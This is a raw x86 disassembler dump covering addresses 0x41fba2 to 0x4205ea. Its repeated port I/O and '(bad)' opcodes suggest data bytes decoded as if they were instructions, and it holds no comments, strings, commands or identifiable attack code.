  41fba2:	sbb    al,0x5b
  41fba4:	out    0x3,eax
  41fba6:	sbb    al,0x5b
  41fba8:	fild   WORD PTR [ebx]
  41fbaa:	push   ds
  41fbab:	arpl   di,bx
  41fbad:	add    eax,0x3e7631c
  41fbb2:	push   ds
  41fbb3:	pop    ebx
  41fbb4:	out    0x3,eax
  41fbb6:	sbb    al,0x63
  41fbb8:	fild   WORD PTR ds:0x3df631e
  41fbbe:	sbb    al,0x5b
  41fbc0:	out    dx,eax
  41fbc1:	add    eax,0x0
	...
  41fbea:	add    BYTE PTR [esi],bl
  41fbec:	pop    ebx
  41fbed:	out    0x5,eax
  41fbef:	push   ds
  41fbf0:	pop    ebx
  41fbf1:	fild   WORD PTR [ebx]
  41fbf3:	sbb    al,0x63
  41fbf5:	out    0x3,eax
  41fbf7:	push   ds
  41fbf8:	arpl   di,bp
  41fbfa:	add    eax,0x5ef631c
  41fbff:	sbb    al,0x5b
  41fc01:	out    0x3,eax
  41fc03:	push   ds
  41fc04:	arpl   di,bx
  41fc06:	add    eax,0x3ef5b1e
  41fc0b:	sbb    al,0x5b
  41fc0d:	out    dx,eax
  41fc0e:	add    ebx,DWORD PTR [esi]
  41fc10:	arpl   di,sp
  41fc12:	add    eax,0x23e85b1e
  41fc17:	pushf  
  41fc18:	pop    ebx
  41fc19:	push   0x685b1c23
  41fc1e:	and    ebx,DWORD PTR [ebx+ebx*2]
  41fc21:	add    ebx,DWORD PTR [si]
  41fc24:	pop    ebx
  41fc25:	and    ebx,DWORD PTR [si+0x685b]
  41fc2a:	add    al,0x9c
  41fc2c:	pop    ebx
  41fc2d:	call   0xe89d9835
  41fc32:	and    ebx,DWORD PTR [ebx+ebx*2]
  41fc35:	out    0x3,eax
  41fc37:	sbb    al,0x5b
  41fc39:	out    0x23,eax
  41fc3b:	pushf  
  41fc3c:	pop    edx
  41fc3d:	out    0x23,eax
  41fc3f:	pushf  
  41fc40:	pop    edx
  41fc41:	add    BYTE PTR [eax+0x38],ch
  41fc44:	(bad)  
  41fc46:	and    BYTE PTR [bp+di+0x0],bl
  41fc4a:	jmp    0x6942576e
	...
  41fc77:	add    BYTE PTR [eax],ah
  41fc79:	(bad)  
  41fc7b:	out    0x1f,eax
  41fc7d:	(bad)  
  41fc7f:	out    0x1f,eax
  41fc81:	pop    ebx
  41fc82:	add    cl,ch
  41fc84:	call   FWORD PTR [edx+0x0]
  41fc87:	jmp    0xe841d7ab
  41fc8c:	(bad)  
  41fc8d:	(bad)  
  41fc8f:	push   0xe9005b20
  41fc94:	pop    ds
  41fc95:	(bad)  
  41fc97:	out    0xff,eax
  41fc99:	pop    edx
  41fc9a:	add    BYTE PTR [ecx-0x8],ch
  41fc9d:	pop    edx
  41fc9e:	add    BYTE PTR [eax+0x20],ch
  41fca1:	(bad)  
  41fca3:	out    0x1f,eax
  41fca5:	pop    ebx
  41fca6:	add    BYTE PTR [ecx+0x40],ch
  41fca9:	pop    ebx
  41fcaa:	add    BYTE PTR [ecx+0x18],ch
  41fcad:	(bad)  
  41fcaf:	call   0x694257f3
  41fcb4:	cmp    bl,bl
  41fcb6:	jmp    DWORD PTR [edi+0x40]
  41fcb9:	(bad)  
  41fcbb:	sbb    BYTE PTR [bp+di+0x0],bl
  41fcbf:	imul   esp,DWORD PTR [eax],0x1fe7ffdb
  41fcc5:	(bad)  
  41fcc7:	call   0x6841d7cb
  41fccc:	clc    
  41fccd:	(bad)  
  41fccf:	and    BYTE PTR [bp+di+0x0],bl
  41fcd3:	jmp    0xe94257f7
  41fcd8:	pop    ds
  41fcd9:	pop    ebx
  41fcda:	add    cl,ch
	...
  41fd04:	add    bh,bh
  41fd06:	(bad)  
  41fd08:	push   0x5b3f
  41fd0d:	test   DWORD PTR [edx-0x80],ebx
  41fd10:	add    BYTE PTR [edx+ebx*2-0x80],dh
  41fd14:	add    ah,dh
  41fd16:	pop    edx
  41fd17:	add    BYTE PTR [eax],al
  41fd19:	add    al,0x3b
  41fd1b:	add    BYTE PTR [eax],0x84
  41fd1e:	cmp    al,BYTE PTR [eax]
  41fd20:	add    BYTE PTR [edx+edi*1+0x0],dh
  41fd24:	add    BYTE PTR [ebp+0x5a],dh
  41fd27:	add    BYTE PTR [eax],al
  41fd29:	inc    esp
  41fd2a:	cmp    al,BYTE PTR [eax+0x5a4400]
  41fd30:	add    BYTE PTR [edx+ebx*2+0x3ab50000],dh
  41fd37:	add    BYTE PTR [eax],al
  41fd39:	les    ebx,FWORD PTR [edx-0x80]
  41fd3c:	add    ah,al
  41fd3e:	cmp    al,BYTE PTR [eax]
  41fd40:	add    BYTE PTR ds:0x3400803a,dh
  41fd46:	pop    edx
  41fd47:	add    BYTE PTR [eax],0x84
  41fd4a:	cmp    al,BYTE PTR [eax]
  41fd4c:	add    BYTE PTR ds:0x7500003a,al
  41fd52:	pop    edx
  41fd53:	add    BYTE PTR [eax],0x74
  41fd56:	cmp    al,BYTE PTR [eax+0x5a0500]
  41fd5c:	add    BYTE PTR [ebp+0x7500805a],al
  41fd62:	cmp    al,BYTE PTR [eax]
  41fd64:	add    ch,dh
  41fd66:	cmp    DWORD PTR [eax+0x0],eax
	...
  41fd90:	add    BYTE PTR [eax],al
  41fd92:	inc    ebp
  41fd93:	push   edi
  41fd94:	add    BYTE PTR [eax],al
  41fd96:	inc    ebp
  41fd97:	push   edi
  41fd98:	or     BYTE PTR [edx],al
  41fd9a:	xor    eax,0x3502085a
  41fd9f:	push   edi
  41fda0:	add    BYTE PTR [edx+0x45],al
  41fda3:	pop    edx
  41fda4:	or     BYTE PTR [eax],al
  41fda6:	inc    ebp
  41fda7:	pop    ecx
  41fda8:	add    BYTE PTR [eax],al
  41fdaa:	xor    eax,0x1c40005a
  41fdaf:	add    al,0x1
  41fdb1:	or     BYTE PTR [esi],bl
  41fdb3:	add    al,0x2
  41fdb5:	or     BYTE PTR [esp+eax*1+0x1],bl
  41fdb9:	or     BYTE PTR [esp+eax*1],bl
  41fdbc:	add    al,BYTE PTR [eax]
  41fdbe:	push   ds
  41fdbf:	add    al,0x2
  41fdc1:	or     BYTE PTR [esp+eax*1+0x2],bl
  41fdc5:	add    BYTE PTR [esi+0x4],bl
  41fdc8:	add    DWORD PTR [eax],ecx
  41fdca:	pop    esi
  41fdcb:	add    al,0x2
  41fdcd:	or     BYTE PTR [esp+eax*1],bl
  41fdd0:	add    DWORD PTR [eax],eax
  41fdd2:	pop    esp
  41fdd3:	add    al,0x1
  41fdd5:	add    BYTE PTR [esi],bl
  41fdd7:	add    al,0x1
  41fdd9:	or     BYTE PTR [esp+eax*1+0x1],bl
  41fddd:	or     BYTE PTR [esp+eax*1+0x1],bl
  41fde1:	add    BYTE PTR [esp+eax*1],bl
  41fde4:	add    al,BYTE PTR [eax]
  41fde6:	pop    esp
  41fde7:	add    al,0x2
  41fde9:	or     BYTE PTR [esi+0x4],bl
  41fdec:	add    cl,BYTE PTR [eax]
  41fdee:	pop    esi
  41fdef:	add    al,0x2
  41fdf1:	add    BYTE PTR [esi],bl
  41fdf3:	add    al,0x1
  41fdf5:	or     BYTE PTR [eax],al
	...
  41fe1f:	fiadd  WORD PTR [ebx]
  41fe21:	add    al,BYTE PTR [eax]
  41fe23:	fadd   QWORD PTR [ebx]
  41fe25:	add    DWORD PTR [eax],eax
  41fe27:	sbb    al,0x4
  41fe29:	add    DWORD PTR [eax],eax
  41fe2b:	fiadd  WORD PTR [ebx]
  41fe2d:	add    cl,BYTE PTR [eax]
  41fe2f:	push   ds
  41fe30:	add    al,0x1
  41fe32:	add    BYTE PTR [esi],bl
  41fe34:	add    al,0x1
  41fe36:	add    dh,bl
  41fe38:	add    eax,DWORD PTR [edx]
  41fe3a:	or     BYTE PTR [esp+eax*1],bl
  41fe3d:	add    DWORD PTR [eax],ecx
  41fe3f:	sbb    al,0x4
  41fe41:	add    al,BYTE PTR [eax]
  41fe43:	fiadd  WORD PTR [ebx]
  41fe45:	add    al,BYTE PTR [eax]
  41fe47:	sbb    al,0x4
  41fe49:	add    DWORD PTR [eax],eax
  41fe4b:	push   ds
  41fe4c:	add    al,0x1
  41fe4e:	add    ah,bl
  41fe50:	pop    edx
  41fe51:	out    0x3,eax
  41fe53:	adc    al,0x59
  41fe55:	out    0x2,eax
  41fe57:	sbb    al,0x99
  41fe59:	out    0x2,eax
  41fe5b:	and    al,0x9b
  41fe5d:	out    0x2,eax
  41fe5f:	sbb    al,0x59
  41fe61:	out    0x3,eax
  41fe63:	sbb    al,0x9b
  41fe65:	out    0x3,eax
  41fe67:	adc    al,0x99
  41fe69:	out    0x2,eax
  41fe6b:	and    al,0x59
  41fe6d:	out    0x2,eax
  41fe6f:	and    al,0x9b
  41fe71:	out    0x2,eax
  41fe73:	sbb    al,0x5b
  41fe75:	out    0x3,eax
  41fe77:	sbb    al,0x59
  41fe79:	out    0x3,eax
  41fe7b:	and    al,0x99
  41fe7d:	out    0x2,eax
  41fe7f:	and    al,0x99
  41fe81:	out    0x2,eax
	...
  41feab:	add    BYTE PTR [ebx+ebx*2],dl
  41feae:	out    0x3,eax
  41feb0:	sbb    al,0x99
  41feb2:	out    0x2,eax
  41feb4:	and    al,0x99
  41feb6:	out    0x3,eax
  41feb8:	and    al,0x59
  41feba:	out    0x3,eax
  41febc:	sbb    al,0x5b
  41febe:	out    0x3,eax
  41fec0:	adc    al,0x9b
  41fec2:	out    0x3,eax
  41fec4:	sbb    al,0x99
  41fec6:	out    0x2,eax
  41fec8:	and    al,0x5b
  41feca:	out    0x2,eax
  41fecc:	sbb    al,0x59
  41fece:	out    0x2,eax
  41fed0:	sbb    al,0x9b
  41fed2:	out    0x3,eax
  41fed4:	and    al,0x5b
  41fed6:	out    0x3,eax
  41fed8:	sbb    al,0x5b
  41feda:	out    0x3,eax
  41fedc:	adc    al,0x9b
  41fede:	out    0x2,eax
  41fee0:	adc    al,0x59
  41fee2:	out    0x2,eax
  41fee4:	sbb    al,0x9b
  41fee6:	test   DWORD PTR [ebx],0x3e73b1c
  41feec:	fdivr  QWORD PTR [edx]
  41feee:	out    0xc3,eax
  41fef0:	inc    ebx
  41fef1:	in     al,dx
  41fef2:	(bad)  
  41fef3:	fcomp  DWORD PTR [edi+0x2c]
  41fef6:	and    cl,ch
  41fef8:	pop    ds
  41fef9:	fwait
  41fefa:	and    cl,bh
  41fefc:	pop    ds
  41fefd:	pop    ebx
  41fefe:	add    cl,bh
  41ff00:	pop    edi
  41ff01:	sub    al,0x20
  41ff03:	jmp    0xe9429a27
  41ff08:	fucomip st,st(3)
  41ff0a:	sbb    al,0xd9
  41ff0c:	fild   QWORD PTR [ebx]
  41ff0e:	add    cl,ch
	...
  41ff38:	add    BYTE PTR [edi],bl
  41ff3a:	fwait
  41ff3b:	add    cl,bl
  41ff3d:	pop    ds
  41ff3e:	pop    ebx
  41ff3f:	and    cl,bl
  41ff41:	pop    ds
  41ff42:	fwait
  41ff43:	add    cl,ch
  41ff45:	fucomip st,st(3)
  41ff47:	sbb    al,0xe9
  41ff49:	pop    ds
  41ff4a:	pop    ebx
  41ff4b:	and    cl,bh
  41ff4d:	fucomip st,st(3)
  41ff4f:	cld    
  41ff50:	jmp    0xd9425a74
  41ff55:	pop    ds
  41ff56:	fwait
  41ff57:	add    cl,bl
  41ff59:	fucomip st,st(3)
  41ff5b:	sbb    al,0xe9
  41ff5d:	fucomip st,st(3)
  41ff5f:	cld    
  41ff60:	jmp    0xf9422b44
  41ff65:	fucomip st,st(3)
  41ff67:	sbb    al,0xf9
  41ff69:	pop    ds
  41ff6a:	pop    ebx
  41ff6b:	add    cl,bh
  41ff6d:	pop    ds
  41ff6e:	fwait
  41ff6f:	and    cl,bh
  41ff71:	pop    ds
  41ff72:	fwait
  41ff73:	and    cl,ch
  41ff75:	pop    ds
  41ff76:	pop    ebx
  41ff77:	add    cl,bl
  41ff79:	pop    edi
  41ff7a:	sub    eax,DWORD PTR [eax]
  41ff7c:	jmp    0xd9622ae0
  41ff81:	pop    edi
  41ff82:	jmp    0x41ff80
  41ff84:	jmp    0xe9422ae8
  41ff89:	pop    edi
  41ff8a:	sub    esp,DWORD PTR [eax]
  41ff8c:	jmp    0xe9625ab0
  41ff91:	pop    edi
  41ff92:	jmp    0x41ffb0
  41ff94:	add    BYTE PTR [ebp+0x57],ah
  41ff97:	add    BYTE PTR [eax],al
  41ff99:	gs push edi
  41ff9b:	inc    eax
  41ff9c:	and    BYTE PTR [eax],al
	...
  41ffc6:	inc    ebp
  41ffc7:	pop    ss
  41ffc8:	cmp    eax,0x3d175500
  41ffcd:	and    BYTE PTR ds:0x25004057,dh
  41ffd3:	pop    ss
  41ffd4:	std    
  41ffd5:	call   DWORD PTR ds:0x520005f
  41ffdb:	pop    edi
  41ffdc:	inc    eax
  41ffdd:	add    ch,dh
  41ffdf:	push   ds
  41ffe0:	std    
  41ffe1:	pop    ds
  41ffe2:	cmc    
  41ffe3:	pop    esi
  41ffe4:	add    BYTE PTR [eax],ah
  41ffe6:	aad    0x1e
  41ffe8:	std    
  41ffe9:	call   ebp
  41ffeb:	pop    esi
  41ffec:	add    BYTE PTR [eax],ah
  41ffee:	in     eax,0x1e
  41fff0:	cmp    eax,0x3d1ef520
  41fff5:	add    ch,al
  41fff7:	pop    esi
  41fff8:	inc    eax
  41fff9:	and    ch,dl
  41fffb:	push   ds
  41fffc:	cmp    eax,0x3d1eb500
  420001:	and    BYTE PTR [ebp-0x2affffa2],dh
  420007:	pop    esi
  420008:	inc    eax
  420009:	and    ch,dl
  42000b:	pop    esi
  42000c:	add    BYTE PTR [eax],al
  42000e:	mov    ch,0x1e
  420010:	std    
  420011:	push   DWORD PTR [ebp-0x6adfbfa2]
  420017:	push   ds
  420018:	cmp    eax,0xfd1e8500
  42001d:	jmp    DWORD PTR [ebp+0x5e]
  420020:	inc    eax
  420021:	add    BYTE PTR [ebp+0x1e],ah
  420024:	std    
  420025:	pop    ds
  420026:	test   DWORD PTR [esi+0x0],ebx
	...
  420051:	add    BYTE PTR [eax],al
  420053:	test   DWORD PTR [esi],ebx
  420055:	cmp    eax,0x5e7520
  42005a:	and    BYTE PTR [ebp+0x5e],ah
  42005d:	inc    eax
  42005e:	add    BYTE PTR [esp+eiz*8],bl
  420061:	sar    bh,0x33
  420064:	hlt    
  420065:	add    BYTE PTR [eax],ah
  420067:	sbb    al,0xf6
  420069:	add    BYTE PTR [eax],ah
  42006b:	sbb    dh,dh
  42006d:	clc    
  42006e:	call   FWORD PTR [edi]
  420070:	hlt    
  420071:	add    BYTE PTR [eax],al
  420073:	sbb    al,0xf4
  420075:	clc    
  420076:	jmp    FWORD PTR [ebx]
  420078:	idiv   al
  42007a:	call   FWORD PTR [edi]
  42007c:	idiv   al
  42007e:	pop    ds
  42007f:	sbb    al,0xf4
  420081:	clc    
  420082:	pop    ds
  420083:	sbb    dh,dh
  420085:	clc    
  420086:	pop    ds
  420087:	and    ah,dh
  420089:	add    BYTE PTR [eax],ah
  42008b:	sbb    al,0xf4
  42008d:	add    BYTE PTR [eax],al
  42008f:	sbb    al,0xf6
  420091:	add    BYTE PTR [eax],al
  420093:	sbb    dh,dh
  420095:	add    BYTE PTR [eax],al
  420097:	sbb    al,0xf4
  420099:	add    BYTE PTR [eax],al
  42009b:	sbb    dh,dh
  42009d:	add    BYTE PTR [eax],ah
  42009f:	and    dh,dh
  4200a1:	clc    
  4200a2:	call   ebx
  4200a4:	repz clc 
  4200a6:	call   FWORD PTR [edi]
  4200a8:	idiv   al
  4200aa:	pop    ds
  4200ab:	sbb    al,0xf6
  4200ad:	add    BYTE PTR [eax],ah
  4200af:	sbb    al,0xf4
  4200b1:	clc    
  4200b2:	call   FWORD PTR [edi]
  4200b4:	test   BYTE PTR [eax],0x0
	...
  4200df:	add    BYTE PTR [eax],ah
  4200e1:	hlt    
  4200e2:	add    BYTE PTR [eax],ah
  4200e4:	sbb    ah,dh
  4200e6:	clc    
  4200e7:	pop    ds
  4200e8:	and    dh,dh
  4200ea:	add    BYTE PTR [eax],ah
  4200ec:	sbb    al,0xf4
  4200ee:	add    BYTE PTR [eax],ah
  4200f0:	and    ah,dh
  4200f2:	clc    
  4200f3:	inc    DWORD PTR [ebx+0x7bfff8f5]
  4200f9:	cmc    
  4200fa:	clc    
  4200fb:	pop    ds
  4200fc:	sbb    ah,dh
  4200fe:	clc    
  4200ff:	pop    ds
  420100:	sbb    al,0x5b
  420102:	jmp    0xe79d1d0a
  420107:	add    ebx,DWORD PTR [edi+ebx*2]
  42010a:	out    0xfb,eax
  42010c:	xor    ebx,DWORD PTR [ebx-0x19]
  42010f:	add    ebx,DWORD PTR [edi+ebx*2]
  420112:	out    0xfb,eax
  420114:	and    ebx,DWORD PTR [ebx-0x19]
  420117:	add    edi,esp
  420119:	pop    edx
  42011a:	jmp    0xe99f351a
  42011f:	sti    
  420120:	sub    ebx,DWORD PTR [ebp-0x17]
  420123:	add    edi,esp
  420125:	pop    esi
  420126:	jmp    0xe9a13d2e
  42012b:	add    ebx,DWORD PTR [ebx+ebx*2]
  42012e:	jmp    0xe79d3d36
  420133:	add    ebx,DWORD PTR [edi+ebx*2]
  420136:	out    0xfb,eax
  420138:	sti    
  420139:	pop    esp
  42013a:	out    0x3,eax
  42013c:	cmp    al,0x5b
  42013e:	out    0xfb,eax
  420140:	or     ebx,DWORD PTR [edi-0x17]
  420143:	sti    
	...
  42016c:	add    bl,ah
  42016e:	call   0x5b7dfd5b
  420173:	out    0xfb,eax
  420175:	xor    ebx,DWORD PTR [edi-0x17]
  420178:	sti    
  420179:	retf   
  42017a:	call   0x5f5e0567
  42017f:	jmp    0xe7a11d7f
  420184:	add    edi,esp
  420186:	pop    esi
  420187:	out    0xfb,eax
  420189:	or     ebx,DWORD PTR [ebx-0x19]
  42018c:	add    ebx,DWORD PTR [ebx+ebx*2]
  42018f:	jmp    0xe99d1d97
  420194:	sti    
  420195:	xor    ebx,DWORD PTR [edi-0x19]
  420198:	add    ebx,DWORD PTR [ebx+ebx*2]
  42019b:	jmp    0xe79d259b
  4201a0:	add    edi,DWORD PTR [edi+ebx*2]
  4201a3:	add    cl,ch
  4201a5:	ja     0x42018f
  4201a7:	cld    
  4201a8:	jmp    0x4201c9
  4201aa:	pop    ebx
  4201ab:	add    al,0xe9
  4201ad:	addr16 call 0xe899eab3
  4201b3:	cld    
  4201b4:	jmp    0x4201d5
  4201b6:	cmp    eax,DWORD PTR [eax]
  4201b8:	test   eax,0xe90ce84f
  4201bd:	dec    edi
  4201be:	call   0x5f61ebbf
  4201c3:	add    BYTE PTR [ecx-0x16efa3d1],ch
  4201c9:	pop    ds
  4201ca:	pop    ebx
  4201cb:	adc    BYTE PTR [ecx],ch
  4201cd:	sub    al,ch
  4201cf:	or     al,0x29
	...
  4201f9:	add    BYTE PTR [eax],ah
  4201fb:	pop    ebx
  4201fc:	add    cl,ch
  4201fe:	pop    ds
  4201ff:	pop    ebx
  420200:	adc    BYTE PTR [ecx],ch
  420202:	and    BYTE PTR [edi+0x0],bl
  420205:	jmp    0x29526129
  42020a:	lock pop ebx
  42020c:	adc    cl,ch
  42020e:	out    dx,eax
  42020f:	pop    ebx
  420210:	add    cl,ch
  420212:	out    dx,eax
  420213:	pop    ebx
  420214:	adc    BYTE PTR [ecx],ch
  420216:	call   0xd02b0276
  42021b:	out    0xfc,eax
  42021d:	sub    DWORD PTR [eax],ebx
  42021f:	pop    ebx
  420220:	add    cl,ch
  420222:	pop    ds
  420223:	pop    edi
  420224:	adc    BYTE PTR [ecx],ch
  420226:	sbb    BYTE PTR [ebx+0x10],bl
  420229:	jmp    0x294ee9dd
  42022e:	test   al,0xe7
  420230:	cld    
  420231:	jmp    0xa9425de5
  420236:	pop    ds
  420237:	pop    edi
  420238:	add    BYTE PTR [ecx-0x16efa0e1],ch
  42023e:	(bad)  
  42023f:	pop    ebx
  420240:	adc    BYTE PTR [ecx+0xfce78f],ch
  420246:	jne    0x4202a3
  420248:	add    BYTE PTR [eax],al
  42024a:	test   DWORD PTR [ebx+0x0],ebx
  42024d:	add    ch,al
  42024f:	pop    ebx
  420250:	add    al,0x10
  420252:	mov    ch,0x5b
  420254:	add    BYTE PTR [eax],dl
  420256:	jne    0x420243
  420258:	cld    
  420259:	jne    0x42034a
	...
  420287:	inc    ebp
  420288:	pop    ebx
  420289:	add    al,0x0
  42028b:	jne    0x420278
  42028d:	add    BYTE PTR [eax],al
  42028f:	xor    eax,0x4500045b
  420294:	jmp    0x420296
  420296:	adc    BYTE PTR [ebp-0x15],al
  420299:	cld    
  42029a:	push   DWORD PTR [ebp+0x5b]
  42029d:	add    BYTE PTR [eax],al
  42029f:	cmc    
  4202a0:	pop    esi
  4202a1:	add    al,0x10
  4202a3:	add    eax,0x45fffceb
  4202a8:	out    dx,eax
  4202a9:	add    BYTE PTR [eax],al
  4202ab:	cmc    
  4202ac:	jmp    0x0:0x5f350ffc
  4202b3:	inc    ebp
  4202b4:	pop    edi
  4202b5:	add    BYTE PTR [eax],dl
  4202b7:	add    eax,0x3510045b
  4202bc:	pop    edi
  4202bd:	add    al,0x10
  4202bf:	cmc    
  4202c0:	pop    edx
  4202c1:	add    BYTE PTR [eax],dl
  4202c3:	lds    ebx,FWORD PTR [edx+0x4]
  4202c6:	add    BYTE PTR ds:0xb50ffcef,al
  4202cc:	pop    edx
  4202cd:	add    BYTE PTR [eax],al
  4202cf:	cmc    
  4202d0:	out    dx,al
  4202d1:	add    BYTE PTR [eax],dl
  4202d3:	add    eax,0x500045f
  4202d8:	pop    edi
  4202d9:	add    BYTE PTR [eax],dl
  4202db:	mov    ch,0x5a
  4202dd:	add    al,0x10
  4202df:	mov    ch,0xea
  4202e1:	cld    
  4202e2:	pextrw ebp,mm2,0xfc
  4202e6:	nop    esp
	...
  420311:	add    BYTE PTR [eax],al
  420313:	add    BYTE PTR [esp+esi*4],bl
  420316:	lock add ebp,DWORD PTR [esp+esi*8]
  42031a:	lock add ebx,DWORD PTR [esp+esi*8]
  42031e:	lock add ebx,DWORD PTR [esp+esi*4]
  420322:	lock jmp FWORD PTR [ebx-0x4c]
  420326:	lock jmp DWORD PTR [ebx-0x4c]
  42032a:	add    BYTE PTR [esp+ebx*1],al
  42032d:	hlt    
  42032e:	add    BYTE PTR [eax],al
  420330:	sub    al,0xf4
  420332:	lock add ebp,DWORD PTR [eax+ecx*2]
  420336:	(bad)  
  420337:	inc    BYTE PTR [ebx-0xc]
  42033a:	add    BYTE PTR [eax],al
  42033c:	sbb    al,0xf4
  42033e:	add    BYTE PTR [eax],al
  420340:	sbb    al,0x78
  420342:	jnp    0x420343
  420344:	sub    ebx,eax
  420346:	cmp    edi,0x23
  420349:	aam    0x83
  42034b:	call   FWORD PTR [ebx]
  42034d:	hlt    
  42034e:	add    BYTE PTR [eax],al
  420350:	sbb    al,0xf4
  420352:	add    BYTE PTR [eax],al
  420354:	sbb    al,0xfe
  420356:	jnp    0x420357
  420358:	add    esp,esp
  42035a:	jle    0x42035b
  42035c:	sti    
  42035d:	addr16 test bh,bh
  420360:	repz repz add BYTE PTR [eax],al
  420364:	sbb    al,0xf4
  420366:	add    BYTE PTR [eax],al
  420368:	sbb    al,0x60
  42036a:	jnp    0x42036b
  42036c:	(bad)  [edi]
  42036e:	cmp    bh,0xd3
  420371:	mov    bh,0x83
  420373:	dec    ebx
  420375:	repz add BYTE PTR [eax],al
	...
  4203a0:	add    BYTE PTR [esp+esi*8],bl
  4203a3:	add    BYTE PTR [eax],al
  4203a5:	sbb    al,0xd4
  4203a7:	jp     0x4203a8
  4203a9:	mov    bl,0x47
  4203ab:	cmp    bh,0xab
  4203ae:	outs   dx,DWORD PTR ds:[esi]
  4203af:	test   bh,bh
  4203b1:	mov    ds:0x1c03e75a,eax
  4203b6:	pop    ebx
  4203b7:	out    0x3,eax
  4203b9:	sbb    al,0x5b
  4203bb:	push   ebp
  4203bc:	jge    0x420349
  4203be:	in     eax,0x62
  4203c0:	add    BYTE PTR [ebx+0x7b8442e5],0xe5
  4203c7:	out    0x3,al
  4203c9:	sbb    al,0x5b
  4203cb:	out    0x3,eax
  4203cd:	sbb    al,0x5b
  4203cf:	repz jnp 0x420435
  4203d2:	in     eax,0x72
  4203d4:	sbb    BYTE PTR [ebx-0x1b],0xee
  4203d8:	adc    BYTE PTR [ebx-0x1b],0xe6
  4203dc:	add    ebx,DWORD PTR [ebx+ebx*2]
  4203df:	out    0x3,eax
  4203e1:	sbb    al,0x5b
  4203e3:	ins    DWORD PTR es:[edi],dx
  4203e4:	jl     0x420421
  4203e6:	in     eax,0x5e
  4203e8:	xor    BYTE PTR [ebx],0xe5
  4203eb:	retf   0x2b82
  4203ee:	in     eax,0xe6
  4203f0:	add    ebx,DWORD PTR [ebx+ebx*2]
  4203f3:	out    0x3,eax
  4203f5:	sbb    al,0x5b
  4203f7:	in     eax,0x7a
  4203f9:	adc    esp,ebp
  4203fb:	call   0x383:0x36e50b81
  420402:	in     eax,0xe6
  420404:	add    eax,DWORD PTR [eax]
	...
  42042e:	sbb    al,0x5b
  420430:	out    0x3,eax
  420432:	sbb    al,0x5b
  420434:	icebp  
  420435:	jp     0x420422
  420437:	in     al,0xc6
  420439:	and    ebx,0x1c03e6e4
  42043f:	pop    ebx
  420440:	out    0x3,eax
  420442:	sbb    al,0x5b
  420444:	out    0x3,eax
  420446:	sbb    al,0x5b
  420448:	out    0x3,eax
  42044a:	sbb    al,0x5b
  42044c:	out    0x3,eax
  42044e:	sbb    al,0x5b
  420450:	mov    eax,DWORD PTR [ecx+0x72ffe4b3]
  420456:	popf   
  420457:	in     al,0xfc
  420459:	out    0x9c,eax
  42045b:	in     al,0xfc
  42045d:	std    
  42045e:	pushf  
  42045f:	in     al,0xfc
  420461:	or     DWORD PTR [ebp-0x62fa031c],ebx
  420467:	in     al,0xfc
  420469:	adc    ebx,DWORD PTR [ebp-0x634c031c]
  42046f:	in     al,0xfc
  420471:	xchg   edi,eax
  420472:	pushf  
  420473:	in     al,0xfc
  420475:	int    0x9c
  420477:	in     al,0xfc
  420479:	mov    ecx,0xa5fce49c
  42047e:	pushf  
  42047f:	in     al,0xfc
  420481:	jnp    0x42041f
  420483:	in     al,0xfc
  420485:	inc    edi
  420486:	pushf  
  420487:	in     al,0xfc
  420489:	dec    ebp
  42048a:	pushf  
  42048b:	in     al,0xfc
  42048d:	sbb    ebx,DWORD PTR [esp+eiz*8+0xbfc]
	...
  4204b8:	add    BYTE PTR [eax],al
  4204ba:	add    BYTE PTR [esp+eiz*8-0x1c540204],bl
  4204c1:	cld    
  4204c2:	in     eax,0xa3
  4204c4:	jecxz  0x4204c2
  4204c6:	jmp    DWORD PTR [ebx-0x5bf8031d]
  4204cc:	jecxz  0x4204ca
  4204ce:	adc    edx,DWORD PTR [ebx+eiz*8-0x1c6bde04]
  4204d5:	cld    
  4204d6:	and    eax,0x3bfce3a4
  4204db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4204dc:	jecxz  0x4204da
  4204de:	imul   edx,DWORD PTR [ebx+eiz*8-0x1c6ba004],0xfffffffc
  4204e6:	push   ebx
  4204e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4204e8:	jecxz  0x4204e6
  4204ea:	pop    ebp
  4204eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4204ec:	jecxz  0x4204ea
  4204ee:	mov    ds:0xb3fce394,eax
  4204f3:	xchg   esp,eax
  4204f4:	jecxz  0x4204f2
  4204f6:	add    BYTE PTR [ecx-0x6200032e],dl
  4204fc:	sar    ah,cl
  4204fe:	(bad)  
  4204ff:	mov    ebp,0xc9fffcd2
  420504:	sar    ah,cl
  420506:	jmp    FWORD PTR ds:0x3dfffcd2
  42050c:	sar    ah,cl
  42050e:	(bad)  
  42050f:	mov    edi,0xcffffcd2
  420514:	sar    ah,cl
  420516:	push   DWORD PTR [edi+0x3fffcd2]
  42051c:	sar    ah,cl
  42051e:	inc    DWORD PTR [eax]
	...
  420548:	fwait
  420549:	sar    esp,1
  42054b:	(bad)  
  42054c:	cmp    eax,0x25fffcd2
  420551:	sar    ah,cl
  420553:	(bad)  
  420554:	std    
  420555:	sar    esp,1
  420557:	(bad)  
  420558:	cmp    ecx,edx
  42055a:	cld    
  42055b:	dec    DWORD PTR [edi-0x2f]
  42055e:	cld    
  42055f:	dec    DWORD PTR [edi-0x2f]
  420562:	cld    
  420563:	push   DWORD PTR [edi-0x2f]
  420566:	cld    
  420567:	(bad)  
  420568:	jge    0x42053b
  42056a:	cld    
  42056b:	dec    DWORD PTR [ebp+0x6bfffcd1]
  420571:	aad    0xfc
  420573:	inc    DWORD PTR ds:0x8700005f
  420579:	aam    0xfc
  42057b:	call   FWORD PTR [edi-0x3800032c]
  420581:	aam    0xfc
  420583:	call   DWORD PTR [edi-0x2800032c]
  420589:	aam    0xfc
  42058b:	jmp    FWORD PTR [ebx-0x3a00032c]
  420591:	pop    esi
  420592:	add    BYTE PTR [eax],al
  420594:	aad    0xd5
  420596:	cld    
  420597:	call   FWORD PTR [esp+esi*8]
  42059a:	add    BYTE PTR [eax],al
  42059c:	sbb    al,0x1c
  42059e:	mov    bh,bh
  4205a0:	mov    ebx,0xb3ff8a1c
  4205a5:	xor    BYTE PTR [ecx-0x76b15401],cl
  4205ab:	inc    DWORD PTR [eax]
	...
  4205d5:	mov    ds:0x9bff895c,eax
  4205da:	cld    
  4205db:	mov    edi,edi
  4205dd:	xchg   ebx,eax
  4205de:	ins    BYTE PTR es:[edi],dx
  4205df:	mov    bh,bh
  4205e1:	mov    ebp,DWORD PTR [esi-0x76]
  4205e4:	inc    DWORD PTR [ebx+0x7bff89de]
  4205ea:	xor    al,0x8a
